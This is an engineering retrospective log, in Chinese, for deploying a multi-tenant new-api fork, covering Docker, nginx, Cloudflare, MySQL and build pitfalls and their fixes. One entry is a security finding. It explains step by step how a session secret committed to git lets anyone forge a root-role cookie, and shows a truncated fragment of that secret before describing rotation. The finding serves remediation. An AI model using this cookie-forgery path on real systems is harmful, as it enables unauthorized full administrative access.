# 工程复盘日志 (RETRO.md)

> **用途**：记录开发过程中反复出现的错误、vibe coding 中遇到的典型困难、以及解决方案。
> 当类似问题再次出现时，先来这里查询，避免重复踩坑。

## 维护规则

1. 每条记录必须包含：**现象、根因、是否已解决、解决方案（或规避方式）**。
2. 未解决的问题必须标注 `[未解决]`，已解决的标注 `[已解决]`。
3. 新条目**追加在对应分类末尾**，不要打乱已有顺序。
4. 如果某条经验已经固化为 `CLAUDE.md` 的硬约束或棘轮条目，在此标注 **"已升级为规则"** 并注明位置（如 `→ CLAUDE.md C3`）。

> **条目模板**（复制到对应分类末尾使用）：
>
> ```markdown
> ### [已解决|未解决] <一句话标题>
> - **现象**：<观察到的报错/异常表现>
> - **根因**：<真正的原因>
> - **解决/规避**：<怎么修的，或暂时怎么绕开>
> - **升级**：<是否升级为规则；如已升级，注明位置，如 → CLAUDE.md C3 / 工作纪律 W4>
> ```

---

## 一、部署与环境

> Docker / Docker Compose / Nginx / MySQL / 网络 / 环境变量 / 证书等部署侧的坑。

### [已解决] 本机 rsync 在沙箱 PATH 下不可用 → 用 tar-over-ssh 上传
- **现象**：`rsync ... root@server:/root/newapi-test/` 报 `rsync: command not found`（虽然 `command -v rsync` 能查到 /usr/bin/rsync，但直接调用在沙箱 exec 下失败）。
- **根因**：沙箱化 Bash 的 PATH/exec 与登录 shell 不一致，rsync 不稳定。
- **解决/规避**：改用 `tar czf - --exclude=... -C <repo> . | ssh newapi628 'tar xzf - -C /root/newapi-test'`，零额外依赖、稳定可用。tar 的 macOS xattr 告警（`LIBARCHIVE.xattr.com.apple.*`）无害可忽略。
- **升级**：已写入部署脚本约定（`scripts/preflight.sh` 之后用 tar-over-ssh）；后续 Slice 部署沿用。

### [已解决] mysql:8.2 首启未就绪 → app 连接重试
- **现象**：app 启动时 mysql 容器尚在初始化，`dial tcp ...:3306: connection refused`（约 7 次）。
- **根因**：`depends_on` 只保证启动顺序、不等就绪；mysql 首次初始化需 ~15s。
- **解决/规避**：app 侧 `gorm.Open`+`Ping` 重试 30×2s；compose `restart: on-failure` 兜底；root 用 `--default-authentication-plugin=mysql_native_password` 规避非 TLS 公钥交换。**已验证**：重试后连上→迁移→seed→listening。

### [已解决] Cloudflare 代理域名报 521（源站无 443）
- **现象**：`tokendream.wedreamhub.com`（CF 橙云代理）经 CF 访问报 `error code: 521`，但源站 `curl -H Host:... http://127.0.0.1/healthz` 正常。
- **根因**：CF 该域 SSL 模式为 **Full**，CF→源站走 **443**，而宝塔 nginx 只监听 80（现网 `api.wedreamhub.com` 也是 80-only，应为 DNS-only 或 Flexible）→ CF 连源站 443 被拒 → 521。
- **解决/规避**：源站侧自治修复——给 `tokendream` vhost 加 `listen 443 ssl` + **自签证书**（CF Full 不校验源站证书），同时保留 80（兼容 Flexible）。无需改 CF 面板。**已验证**：CF 全链路 healthz/品牌/钱包均 200。
- **升级**：测试栈单域名用自签即可；正式上线 `*.wedreamhub.com` 通配建议用 CF Origin CA 证书（Full strict）或宝塔 Let's Encrypt。`scripts/` 可加 vhost 模板。

### [已解决] 未注册子域 / 野域名指向平台 IP 会看到主站控制台（主站兜底过宽）
- **现象**：任意 `foo.wedreamhub.com`（未建租户）或把野域名 A 记录指向平台 IP 命中通配 vhost 时，后端解析无租户 → 前端 `getTenantCurrent` 返 null → **回落渲染主站**。用户担心"改个 DNS 就能到主站"。
- **根因**：`/api/tenant/current` 对"无租户命中"只有一种响应（`TENANT_NOT_FOUND`），前端把它一律当主站（no-op）。"主站兜底"覆盖了 www 之外的所有未知子域，语义过宽。
- **解决/规避**：改「无租户命中」为**三态**——新增 `tenant.IsMainSiteHost(host)`（apex+www+非平台域→主站；`*.wedreamhub.com` 下未注册子域→false）+ 错误码 `SITE_NOT_ACTIVATED`；`HandleTenantCurrent` 据此分返；前端 `resolveTenant()` 用 `getApiErrorCode` 区分，`__root.tsx` 命中 `not-activated` 渲染全屏「站点未开通」页替代 Outlet。apex 由 `deploy/nginx/apex-redirect.wedreamhub.com.conf` 301→www。**www=主站、其余子域=代理空间、agentdemo 等已注册租户零改动**。（本机无 Go 工具链，后端 `go build`/`go test ./internal/tenant/` **待服务器验证**；前端 `node_modules` 未装，typecheck 一并在服务器跑。）
- **升级**：主站 Host 严格限 www/apex（+ localhost/IP 直连兜底）；新增"无租户命中"分支时必须走 `IsMainSiteHost` 区分，不得再无条件回落主站。设计落地见 `doc/domains-ssl.md §6.4`。

### [已解决] 长镜像构建期 SSH 连接被远端关闭（构建仍完成）
- **现象**：`ssh ... 'docker compose up -d --build'` 在构建中途返回 `exit 255 / Connection closed by remote host`。
- **根因**：构建（go+node 多阶段）+ 运行容器同时占用，输出流式传输期间 SSH 会话被远端断开（资源瞬时压力/网络抖动）；但 `docker compose up -d --build` 的构建是在服务器侧进行，**断的是 ssh 输出流、不是构建本身**。
- **解决/规避**：重连后 `docker compose ps`/`docker images`/`docker logs` 核实——镜像已重建、容器已 healthy、seed 已跑。**构建实际完成**。
- **升级**：后续长构建可改 `ssh newapi628 'cd ... && nohup docker compose ... up -d --build > /tmp/build.log 2>&1 &'` 后轮询 `build.log`，避免 ssh 断流误判；或先 `docker compose build` 再 `up -d`。

### [已解决] compose 未加载 `.env`（上游 Key 注入为空）
- **现象**：app 启动 compose 警告 `The "UPSTREAM_API_KEY" variable is not set. Defaulting to a blank string.`，上游调用因无 Key 失败。
- **根因**：`docker compose -f deploy/docker-compose.test.yml ...` 默认从 **compose 文件所在目录**（`deploy/`）找 `.env`，而我把 `.env` 放在了项目根 `/root/newapi-test/.env`（cwd），未被加载。
- **解决/规避**：部署命令显式 `--env-file /root/newapi-test/.env`：`docker compose -p newapi_test --env-file /root/newapi-test/.env -f deploy/docker-compose.test.yml up -d`。**已验证**：上游 env 注入、`/v1` 真实调用、双桶扣费全通。
- **升级**：部署脚本固定带 `--env-file`；上游 Key 仅存服务器 `.env`(600)，仓库只引用 `${UPSTREAM_API_KEY}`，并在上传前 `grep` 确认无明文 Key（已纳入预上传检查）。

### [已解决] 我们的表名与 new-api 原生表撞车（user_subscriptions）
- **现象**：目标③ 桥接原生订阅时，我们的 tokenplan 订阅表与 new-api 原生 `model.UserSubscription` **都映射物理表 `user_subscriptions`**。原生先迁移后，我们 `AutoMigrate` 给它加 `source_order_id NOT NULL UNIQUE` → MySQL 报 `Cannot add a UNIQUE column` 或合出"被污染"的表（原生 INSERT 撞空串 unique 索引而失败）。前端/计费此前没炸，仅因从没真插过订阅（0 行）。
- **根因**：复用原生计费=原生必须独占 `user_subscriptions`（`PreConsume/HasActive` 查它），我们的表不能同名。
- **解决/规避**：我们的表 **改名 `user_subscriptions`→`tokenplan_subscriptions`**（`internal/tokenplan/gormrepo` `TableName()`）。**已有库的清理（W4）**：服务器上那张被污染的 `user_subscriptions`（0 原生数据）→ `DROP TABLE user_subscriptions` → 重启 app，原生 `InitDB` 重建干净表（已在测试栈执行验证：重建后无 `source_order_id` 列、原生订阅 INSERT 成功）。
- **升级**：**新增任何 GORM 表前，先 grep new-api `model/` 确认表名不撞**（尤其 user/token/subscription/channel/log 等高频名）；与原生共存的功能优先复用原生表，不另建同名表。文档 `user_subscriptions`→`tokenplan_subscriptions` 待同步（proposal §6.19、internal/stats 注释，W5）。

### [已解决] `.gitignore` 裸目录名 glob 静默吞掉新增源文件
- **现象**：新增买家路由 `web/default/src/routes/_authenticated/plans/index.tsx` 本地能构建进 bundle、页面正常，但 `.gitignore` 第 25 行裸写 `plans`（本意忽略根级脚本目录）会**匹配任意层级**名为 `plans` 的路径 → `git add` 静默跳过该文件，提交后路由会丢。前端 Worker 用 `git check-ignore -v` 发现。
- **解决/规避**：裸 `plans` 锚定为 `/plans`（只忽略根级）；提交前 `git diff --cached --name-only | grep` 确认关键新文件已暂存。
- **升级**：新增源文件后（尤其路径含常见词 plans/cache/dist），**提交前 `git check-ignore` 抽查**；`.gitignore` 规则尽量锚定 `/`。

### [已解决] new-api 内嵌双前端：我们的页面在 default 主题，但默认服务 classic
- **现象**：5a/6a 都对，admin API 返回 6 档套餐，但 `https://tokendream...` 左侧栏**无「套餐管理」**、`/token-plans` 空白。排查良久（怀疑构建缓存/路由/sidebar 过滤），`docker build --no-cache` 重建也不出。
- **根因**：new-api **同时内嵌两套前端** `web/default`(新版 shadcn/TanStack) + `web/classic`(经典 Semi-UI)，`main.go` 按系统选项 **`theme.frontend`** 选择服务哪个，**默认 `classic`**（`common/constants.go`、`setting/system_setting/theme.go`）。我们所有 Phase 2 前端工作都在 `web/default`——但线上服务的是 classic（它没有 token-plans），所以页面/菜单永远不出现。前端 Worker 本地 `bun run build` + grep `web/default/dist` 证明 token-plans **确实在 default 产物里**（`tp-admin-page` 在 `async/3674*.js`）→ 锁定是"服务的主题不对"，非代码 bug。
- **解决/规避**：`PUT /api/option {key:"theme.frontend",value:"default"}`（admin cookie + `New-Api-User` 头；值仅 default/classic）→ 立即生效、无需重建（两套 dist 已内嵌）。playwright 验证：登录后侧栏「套餐管理」✅、`/token-plans` 渲染 6 档套餐 ✅。
- **升级**：**部署后必须把 `theme.frontend` 设为 `default`**（否则服务经典前端、看不到我们的页面）——已记为部署步骤；可在 `mtwire` seed 里幂等设置以免 fresh DB 回退 classic。改前端找不到效果时，**先确认服务的是哪套主题**。

### [已解决] macOS tar 带进 `._*` AppleDouble 垃圾文件
- **现象**：`tar -C mac . | ssh 'tar x'` 上传后，服务器 `src/routes/.../` 出现 `._index.tsx` 等垃圾文件（macOS 扩展属性/资源叉），可能干扰前端路由扫描/构建。
- **解决/规避**：服务器 `find /root/newapi-test -name '._*' -delete`；后续 Mac 打包加 **`COPYFILE_DISABLE=1 tar ...`**（或 `--no-mac-metadata`）避免生成。
- **升级**：上传命令固定带 `COPYFILE_DISABLE=1`，纳入部署脚本。

### [已解决] P1-BASE-02 渠道/relay 跑通 —— 4 个连环坑（建渠道 panic / 双 /v1 / 模型价 / 钩子挂错函数）
- **① 建渠道 panic**：`POST /api/channel/` 用扁平 payload(`{name,type,key,...}`)→ `AddChannelRequest.Channel`(嵌套 `*model.Channel`,`json:"channel"`) 为 nil → `validateChannel(nil)` 在 `ValidateSettings`(model/channel.go:942) nil deref。**非 fork bug**。**修**：payload 必须 `{"mode":"single","channel":{...}}`（新版前端就是这么发的）。
- **② base_url 双 `/v1`**：channel base 填 `…codexapis.com/v1`，new-api 自动追加 `/v1/chat/completions` → `/v1/v1/...` Invalid URL。**修**：base_url 只到域名根 `https://www.codexapis.com`（去 /v1）。
- **③ 模型价未配**：`模型 gpt-5.4-mini 的价格未配置`。**修**：`PUT /api/option {key:"ModelRatio",value:"{\"gpt-5.4-mini\":1}"}`（保留计费，**不用自用模式**，否则不扣费无法验倍率）。
- **④ consume_commission 不触发**：钩子挂 `service/quota.go PostConsumeQuota`，但**文本中继结算实际走 `service/text_quota.go PostTextConsumeQuota`**（前者文本路径根本不调）。**修**：在 `PostTextConsumeQuota` 的 `RecordConsumeLog` 后也挂钩（幂等键 RequestId，两处共存不双计）。
- **验证**：/v1 真实调 gpt-5.4-mini 通；用户组倍率 override 3.0 → 计费 **3.02×**（消费日志 `group_ratio:3` vs 关闭后 `group_ratio:1`）；consume_commission demoagent 得 ¥0.0085（`consume:wallet`）；双桶（admin=订阅桶 `billing_source:subscription`/chanuser1=钱包桶 `wallet`）日志确认。
- **升级**：①建渠道/改价的正确 payload 记此（嵌套 `channel`、base_url 去 /v1、ModelRatio 配价）；②**新增 relay 旁路钩子必须确认挂在文本结算 `PostTextConsumeQuota`，不是 `PostConsumeQuota`**。

### [已解决] 通配 443 vhost 劫持「只 listen 80」的现网 vhost 的 HTTPS（差点静默打挂现网 api）
- **现象**：加 `*.wedreamhub.com` 通配 443 vhost(→3100) 后，现网 `api.wedreamhub.com` 经 CF 的 HTTPS **被劫持到我们新栈 3100**（`/api/tenant/current` 返我们的 `TENANT_NOT_FOUND`、`/api/status` start_time = 新栈）。差点以为"现网未受影响"（curl 不带正确 SNI 时 200 误判）。
- **根因**：宝塔 api vhost **只 `listen 80`**；CF SSL=Full → 经 **443** 回源；api:443 无精确匹配 → 落到通配 vhost → 转 3100。nginx **精确 server_name 优先于通配**，但前提是存在精确的 443 server。
- **解决**：新增**精确 `server_name api.wedreamhub.com; listen 443 ssl` vhost → 现网 3000**（`deploy/nginx/api-443-to-origin.wedreamhub.com.conf`，证书复用通配 Origin CA、`Host 127.0.0.1` 镜像现网反代）。验证（**必须带正确 SNI**，`curl --resolve` 或经 CF）：api→3000(start_time 现网)、tokendream/子域→3100。
- **升级**：**加通配 443 vhost 后，必须为所有"只 listen 80"的现网精确域名补一条精确 443 vhost 指回其后端**，并用 `curl --resolve <域名>:443:IP`（带 SNI）逐一核验路由——`curl -H Host` 不设 SNI 会误判。属 C1「不碰现网」红线的隐性陷阱。

### [已解决] 自定义域名证书：宝塔接管 Nginx 下用「每域名独立 vhost + 不声明 default_server」零冲突共存
- **现象**：要让任意代理自定义域名（A 记录直指主站 IP）反代到多租户栈 3100 并签 LE 证书，但宝塔接管了 Nginx（`/www/server/panel/vhost/nginx/`，主配 `include *.conf`），盲目加 `default_server` 会与宝塔 `0.default.conf` 抢每端口唯一的 default 槽位。
- **根因**：nginx 每个 `listen` 端口只允许一个 `default_server`；但**精确 `server_name` 匹配优先于 default**（同 §一 通配劫持那条的反向利用）。自定义域名是具体主机名，天然可被精确 server 块命中，无需 default。
- **解决/规避**：`scripts/issue-cert.sh` 为每个域名写 `custom_<域名>.conf` 到宝塔 vhost 目录（被主配 `include *.conf` 自动加载），**不声明 default_server**；HTTP-01 走共享 webroot `/www/wwwroot/acme-challenge`，签发前先写「仅 80」vhost+reload 让 challenge 可达，装证后再写「80→443」完整 vhost。`Host $host` 透传供后端按 Host 解析租户。**红线**：只反代 127.0.0.1:3100，绝不碰现网 3000。已 E2E（绑定→TXT→active→解析→品牌→解绑）全绿；真实 LE 签发需代理提供可控域名（A 直连、勿套 CF 代理，否则 HTTP-01 取不到）。
- **升级**：宝塔下加自定义反代一律走「手写精确 server_name vhost + 不碰 default + 勿在面板编辑这些站点」。已写入 `doc/domains-ssl.md` §6.5 / `scripts/README.md`。

### [已解决] 服务器磁盘被 Docker build cache 撑满（每次 `--build` 累积，81% → prune 后 25%）
- **现象**：`df -h /` 用到 81%（76G/99G，仅剩 19G）；`docker system df` 显示 **Build Cache 56.5GB，其中 55.7GB reclaimable**（占满半块盘），Images 另有 4.7GB reclaimable（旧 `prev-*` 回滚 tag + dangling）。磁盘逼近满，后续 `--build` 有失败风险。
- **根因**：每次 `docker compose … up -d --build` 都往 BuildKit build cache 累积层；多轮部署后无人清理 → cache 无上限膨胀。与运行镜像/容器/DB **无关**，纯构建副产物堆积。
- **解决/规避**：`docker builder prune -f`（只删构建缓存，下次构建自动重生、仅慢一次；**不碰**镜像/容器/volume/DB）→ 一次回收 55.7GB；`docker image prune -f` 只删 dangling（保留 `prev-*` 回滚 tag）再回收 0.35GB。**81% → 25%（71G free）**。go mod/build 的**命名 volume**（newapi_gomodcache 等）是提速用的、`builder prune` 不动它们，放心。
- **升级**：**每隔若干次部署、或见 `df` 逼近 80% 就 `docker builder prune -f`**——安全的例行维护，别等构建因 no space 失败才处理；判断看 `docker system df` 的 Build Cache RECLAIMABLE 列。（`/root/newapi-test-old-*`、`/root/newapi-compile` 等 /root 旧源码副本另占 ~5.7G，属人工备份，删前问用户。）

### [已解决] MySQL 不支持 `CREATE INDEX IF NOT EXISTS`——sqlite 单测过、MySQL 迁移报 Error 1064
- **现象**：breakage 监控部署到测试栈后，迁移日志 `Error 1064 (42000): You have an error in your SQL syntax ... near 'IF NOT EXISTS idx_breakage_snap_tenant_period ON breakage_snapshots ...'`（`gormrepo.go` ensureIndex）。本机全部单测（`glebarez/sqlite` :memory:）却是全绿。
- **根因**：**MySQL（含 8.x）不支持 `CREATE INDEX IF NOT EXISTS`**（仅 MariaDB 10.1.4+/pg/sqlite 支持；agent 写的注释「MySQL 8.0.13+ 支持」是错的，把 MySQL 当 MariaDB）。sqlite 支持该语法 → 单测测不到；生产 MySQL 才炸。**这是 sqlite测试→MySQL生产的系统性方言盲区**：凡「只在 MySQL 跑的原生 SQL」单测都覆盖不到。代码已 best-effort 吞错、不阻断迁移，故功能没坏，但 perf 索引没建上 + 每次迁移刷错误日志。
- **解决/规避**：照 `internal/report/reportrepo/migrate.go` 已在生产 MySQL 验证的方言分支：MySQL 先查 `information_schema.statistics` 判索引存在、缺失才 `CREATE INDEX`（**无** IF NOT EXISTS）；sqlite/pg 用原生 IF NOT EXISTS。`dbType` 取 `common.MainDatabaseType()`（sqlite 单测未设 → "" → 走 IF NOT EXISTS 分支，不受影响）。修后重新部署，两索引（唯一键 + tenant_period）均建成、日志无 1064。
- **升级**：补 `AutoMigrate` 不自动建的组合/perf 索引，一律用方言分支 `ensureIndex(db, common.MainDatabaseType(), ...)`；**别用 `CREATE INDEX IF NOT EXISTS`（MySQL 会炸）**。凡涉及只跑 MySQL 的原生 SQL，sqlite 单测过不代表生产过——必上服务器容器验证。已存记忆 [[mysql-create-index-if-not-exists]]。

### [已解决] 计费吞吐卡 ~95rps / CPU 75% 空闲——根因是 MySQL per-commit fsync 天花板，非 app 逻辑
- **现象**：文本请求吞吐卡 ~95rps（单用户 ~31rps）、~30ms 计费尾延迟，但 CPU 仅 75% 占用（≈25% 空闲）→ 非硬件瓶颈。初判为「计费未批量：每请求同步写 users/tokens/channels + logs INSERT，各独立事务各触发 fsync」。
- **根因**：MySQL 默认 `innodb_flush_log_at_trx_commit=1` + `sync_binlog=1`（本栈 `log_bin=ON`）→ **每次 commit 都要 fsync（redo，且开了 binlog 再来一次）**，单盘 fsync 延迟把提交吞吐钉死。实测：scratch 表单连接串行单行提交仅 **523 commits/s**、~1.19 fsync/commit。聚合 ~95rps × 每请求约 5 次 commit（钱包 4 UPDATE+1 log，或订阅桶 1 FOR UPDATE 事务+1 log）≈ 475 commits/s，**正好顶到 523 天花板**——CPU 在等磁盘 fsync 返回，故空闲。
- **解决/规避**：**先量后改（optimize-measure）**。DB 杠杆（零代码/零停机/可秒回退，覆盖钱包/订阅桶/日志三条同步路径）：`SET GLOBAL` 即时生效 + `SET PERSIST innodb_flush_log_at_trx_commit=2; sync_binlog=0`（写入数据卷 `mysqld-auto.cnf`，重启/recreate 保留）+ `deploy/docker-compose.test.yml` mysql `command:` 兜底（全新卷）。同基准复测 **523→5763 commits/s（11×）**，fsync/commit 1.19→0.076。durability：进程崩溃不丢已提交扣费，仅宿主机断电丢 ≤1s（用户拍板可接受）。第二杠杆 app 层 batch-update（`BATCH_UPDATE_ENABLED`，机制早在 `model/utils.go` 只是默认关）已 staged 待低峰重启激活，用于消除 `channels.used_quota` 热行锁竞争（非 fsync）；安全前提=Redis 为额度权威（`cacheDecr*` 同步扣 Redis）故 DB 列滞后不超扣。
- **坑点**：① 症状「CPU 空闲 + 吞吐卡 + 尾延迟」= 典型 **fsync-bound**（等盘），别往 app 算法上找。② 诊断用 **scratch 表 `SET PERSIST`+存储过程 loop 提交** 隔离 fsync 天花板，零上游成本/零真实数据变更/可精确复测，胜过在生产压测（费真实 token + 扰动用户）。③ MySQL 8 用 `SET PERSIST` 持久化动态变量（写 `mysqld-auto.cnf`，落在挂载卷）——比改 compose `command` 免 recreate mysql。
- **升级**：暂不升级为硬约束（属调优而非红线）。记忆 [[billing-fsync-tuning-and-batch]]；相关 [[used-usd-dead-column-real-usage-native-bucket]]。

### [已解决] 生产会话/加密根密钥被内联成 compose 里的 git 字面量（Critical，免密全站 root）
- **现象**：`deploy/docker-compose.test.yml:17`（**这就是生产部署文件**）写了 `SESSION_SECRET: "${SESSION_SECRET:-4329de40…（48 hex）}"`，注释却自称「仅供测试，勿用于生产」。服务器 `/root/newapi-test/.env` 未设 `SESSION_SECRET` → compose 插值**回落到 git 里的字面量**；`CRYPTO_SECRET` 全程未设 → `common/init.go:59-62` 再回落 `CryptoSecret = SessionSecret`。线上只读比对坐实：git 内联默认值与容器 `newapi_test-app-1` 实际在用值 `sha256[0:16]` 均为 `eb1c24ec27668b88`，**逐字节相同**；`git log -S` 仅 2 条（`fd17844` 引入 / `493b830`）→ **从未轮换**。
- **根因**：`${VAR:-默认}` 的「默认」写死在受 git 跟踪的文件里 = 把根密钥提交进代码库。同一把密钥既做 `main.go:191` `cookie.NewStore` 的会话签名、又做 `common/crypto.go:18` 的 HMAC。消费链：`controller/user.go:138-142` 把 `id/role/status` 明文塞进 session → `middleware/auth.go:39-42` 原样取回信任（`RoleRootUser=100`）。**真实失败场景**：任一有仓库读权限者（或流出的克隆 / 被翻出的 `repomix-output.xml`）读到该行 → 本地用 `gorilla/securecookie` 以此密钥签一个 `{"id":1,"role":100,"status":1}` cookie → 带 `New-Api-User:1` 请求 `https://www.wedreamhub.com/api/user/` → `auth.go:132` 的 `role<minRole` 通过 → **免密全站 root（改支付凭据、审批提现、读全租户财务），且日志与正常管理员登录无任何区别**（无登录事件、无异常 IP）。是私有仓库（匿名 404），故非「全网可读」，但「密钥进代码/产物」本身即 Critical。
- **解决/规避**（纯静态修复，本机改代码、轮换+部署在服务器）：
  1. `docker-compose.test.yml` 去掉内联默认，改 **fail-closed** `:?`——未在服务器 `.env` 提供则 compose **直接报错拒绝 `up`**，把「覆盖只是约定」升级为「强制」；同时**拆两把**：新增 `CRYPTO_SECRET: "${CRYPTO_SECRET:?…}"`，让签 cookie 与做 HMAC 用不同密钥（分权，`init.go` 的 `CryptoSecret=SessionSecret` 回落分支在本栈永不再触发）。
  2. `git rm --cached repomix-output.xml`——19.8MB 生成物早在 `.gitignore:75` 却仍被跟踪（提交在先），是泄漏值的**第二份拷贝**；`git grep` 已确认真值现已从**全部 tracked 文件的索引**消失。（其余 `.env.example`/`deploy/.env.test.example`/`docker-compose.yml` 只是 `random_string` 占位，无真值。）
  3. **服务器侧轮换（外部前置，务必先做，否则本次改动会让 `up` 直接失败）**：在 `/root/newapi-test/.env` 追加**两把互不相同**的**全新**随机值 `SESSION_SECRET=$(openssl rand -hex 32)`、`CRYPTO_SECRET=$(openssl rand -hex 32)`（禁止再用旧字面量），再 `docker compose -p newapi_test --env-file /root/newapi-test/.env -f deploy/docker-compose.test.yml up -d app` 重启激活。轮换代价：旧会话 cookie 全失效（用户需重登）、`token_cache`/`file_service` 缓存键重算（**仅缓存 miss，无持久化数据损失**——已核实 `CryptoSecret` 仅用于派生缓存 key，未参与任何入库/比对）。
  4. 轮换后旧值即成**死字符串**，故遗留在 git 历史（`fd17844`/`493b830`）无害；如需彻底洁净可后续 BFG 洗历史（非必须、非阻塞）。
- **升级**：**已升级为规则 → CLAUDE.md C1**（禁止把任何密钥/凭据的字面量写进受 git 跟踪的文件；密钥只存服务器 `.env`(600)，仓库仅 `${VAR}` 引用且用 `:?` fail-closed）。相关既有纪律：[[deployment.md §.env]]、W4（密钥不入库）。

### [已解决] 生产无版本身份：VERSION 0 字节 + 服务器无 .git → /api/status version="" 且 --git 回滚必败（#12，结构性缺口）
- **现象**：三条溯源路径同时断掉，无法回答「生产现在跑的是哪份代码」，也无法重建/安全回退它。逐条实测：① `wc -c VERSION`→`0`（且 `git ls-files` 确认已跟踪）→ `Dockerfile:39` `-X '…common.Version=$(cat VERSION)'` 注入空串（连源码默认 `common/constants.go:16` 的 `v0.0.0` 都被覆盖）→ 线上 `curl /api/status | jq .data.version`→`''`；② `deploy.sh` 打包的是 Mac 脏工作树（`tar -C "$LOCAL_REPO" .`，非任何 git ref），而 `deploy.sh:60` `git tag -f "$TAG"` 打在 HEAD 上 → tag 指向的代码可能从未上线（工作树 dirty 时）；③ `deploy.sh:93 --exclude='./.git'` 保证服务器 `$SERVER_REPO` 下**永远没有 .git**，而 `rollback.sh:35-36 rollback_git` 正是 `git -C "$SERVER_REPO" fetch/checkout`，且 `:45` 在镜像回滚失败时**恰恰推荐** `--git <tag>` → 指向一条不可能成功的路；④ `deploy.sh:63-73` 每次把 `:latest` 覆盖成 `:prev` → 回滚深度恒为 1。
- **根因**：制品从「脏工作树」构建、且不携带任何可溯源身份；服务器是「非 git 的 rsync 副本」，却把回滚兜底建在服务器不存在的 `.git` 上。真实失败场景：线上计费错账 → 想确认是否含某修复 → `/api/status` 给 `''` → 查 `deploy-*` tag → tag 指向 HEAD 但部署时工作树 dirty → 该 tag 代码从未在生产跑过 → 服务器也无 .git 可查 → 只能靠 `ls -la` 文件 mtime 猜 → 排障从 10 分钟变半天且结论不可信。另一场景：部署 A（潜伏 bug）→ 次日部署 B（`:prev` 被 A 覆盖）→ 发现 bug 来自 A → 只能退到 A（仍有 bug）→ 按脚本提示走 `--git` → 报错。
- **解决/规避**（本机改代码/脚本，构建+部署+验证在服务器）：① 追踪的 `VERSION` 从 0 字节改 `v0.0.0-dev`（不再注入空串）；`Dockerfile` 三处 `$(cat VERSION)` 加空串兜底（回落 `v0.0.0-unknown`）。② `deploy.sh` 用「git 短 SHA + `-dirty` + 时间戳」算真实版本串，**解包后、构建前**盖进服务器 `VERSION` + `deploy-manifest.json`（Dockerfile 烤进 `common.Version`/前端 + `COPY deploy-manifest.json /`）；`git tag` 步骤在 dirty 时明确告警「tag≠实际部署树，权威版本见归档」。③ 实际部署的源码 tar 归档 `/root/deploy-archives/src-<ts>.tgz` + sidecar `.version`/`.manifest.json`（留 7 份），令无 `.git` 也可重建。④ `rollback.sh` 删除必败的 `--git`（改为显式报错并指向正确路径）、新增 `--to <ts>`（从归档重建、恢复真实版本身份）+ `--list`，保留 `:prev` 秒级。⑤ 部署尾端到端自检：`/api/status` 报告版本 == 本次盖入版本，不等即告警（防 ① 静默回归）。本机 `bash -n` + 关键逻辑（manifest JSON、版本抽取 sed、归档 prune、ssh 远端 re-parse）本地模拟全通过；**端到端待服务器下次部署验证**（W4）。
- **升级**：**已升级为规则 → CLAUDE.md C6**（上线制品必须携带可溯源+可重建版本身份；回滚兜底路径必须真实可达）。同属「清单挑选式遗漏」家族（C2/C3/C5）。相关：[[deployment.md]]、[[server-build-deploy-topology]]、W4。

### [已解决] deploy.sh「部署成功」但线上跑旧码：containerd 存储 + BuildKit attestation 清单列表没把 `:latest` 挪到新镜像
- **现象**：`SKIP_PREFLIGHT=1 deploy/ops/deploy.sh` 全绿退出 0（步骤 8「健康通过｜镜像已更新≠:prev」），但线上仍是旧前端 bundle、改动不生效。**直连源站** `curl -H 'Host: www…' 127.0.0.1:3100/` 返回旧 `index.74058af046.js`（CF `cf-cache-status: DYNAMIC` 已排除是缓存）。`docker images newapi_test-app` 显示 `:latest` 仍指 13:52 的旧镜像 `7d2abc`，而本次构建产物 `1be3985b`（14:13:41，构建日志 `exporting manifest list sha256:1be3985b…` + `naming to …:latest done`）**沦为 `<none>` 悬空镜像**；运行容器虽在部署时被 `Recreated`，却落在旧 `:latest` 上。
- **根因**：服务器 Docker 29 用 **containerd 快照器镜像存储**（`docker info`：`Storage Driver: overlayfs` + `io.containerd.snapshotter.v1`），`docker compose build`（BuildKit「default/docker driver」）**默认产出带 attestation（provenance/SBOM）的 OCI manifest list**。这种清单列表在 tag 到 `:latest` 时没替换旧 tag → 新镜像悬空、`:latest` 停在旧镜像 → `up -d --build` 用旧 `:latest` 把容器 recreate 成旧码。deploy.sh 步骤 8 的 false-success 兜底只比 `docker image inspect :latest` 的 ID——而该 ID 在 manifest-list 下**解析漂移**（同一 tag 先后 inspect 出 `7d2abc`/`a06988c9` 等不同值），且它只验证「tag 指向的镜像变没变」、**不验证运行容器实际跑哪个镜像**，故假通过。
- **解决/规避**：① 应急——把本次构建的真镜像重打 tag 再强制换容器：`docker tag <本次构建的 manifest-list ID> newapi_test-app:latest && docker compose -p newapi_test --env-file .env -f deploy/docker-compose.test.yml up -d --force-recreate --no-build app`；本次 `1be3985b→:latest` 后源站立即出新 bundle `index.d070d55ce6.js`。定位真镜像：`docker images -a` 里找时间戳=本次构建、且 ID 与构建日志 `exporting manifest list sha256:…` 相同的那个 `<none>`。② 判「改动进没进线上」**永远以运行容器/源站直连为准**，别信 deploy 打印的「部署成功」，也别 grep `:latest`（manifest-list 下 tag 解析飘）：用 `curl 127.0.0.1:3100/ | grep index 哈希` 或 `docker exec <容器> grep -a <标记串> /new-api`（grep 二进制，勿用 strings，见本节旧条）。③ 根治（**待做，改 deploy.sh 前先问用户**）：构建禁用 attestation（`BUILDX_NO_DEFAULT_ATTESTATIONS=1` 或 `--provenance=false --sbom=false`）产出单一镜像使 `:latest` 正常移动；并把步骤 8 兜底改成比对**运行容器 `.Image` 摘要 vs 本次构建镜像摘要**，而非 tag inspect。
- **升级**：暂记 RETRO（根治改 deploy.sh 待用户确认）。相关记忆 [[verify-live-bundle-async-chunks]]（同类「已修但线上旧样，先怀疑没部署」）；呼应纪律 W4（部署在服务器）。

---

## 二、构建与依赖

> Go 编译、Node 前端构建、版本不兼容、依赖拉取、缓存等构建侧的坑。

### [已解决] golangci-lint 未装于 Mac，质量门降级
- **现象**：Mac 本机无 `golangci-lint`，prompt.md 约定的 Go 静态检查门无法原样执行。
- **根因**：本机未安装，且为保持 Worker 离线、零外部依赖（纯标准库单测），不临时安装。
- **解决/规避**：质量门降级为 `go build` + `go vet` + `gofmt -l` + `go test -race -cover`（均内置、离线可用）；集成阶段在服务器/CI 安装 `golangci-lint` 补强。
- **升级**：CI 已于 2026-07-09 落地（`.github/workflows/ci.yml`，跑 go build/vet/test -race + 前端 bun test/build，见本节末「CI 只剩反灌水 bot」条）；但 **golangci-lint 仍未纳入 CI**，本条的静态检查门禁仍待后续补 `golangci-lint-action`。

### [已解决] Phase 2 · A 全量 fork：合并 new-api 基座的要点
- **现象/任务**：把仓库变成 `QuantumNous/new-api` fork，并入我们的 `internal/`。
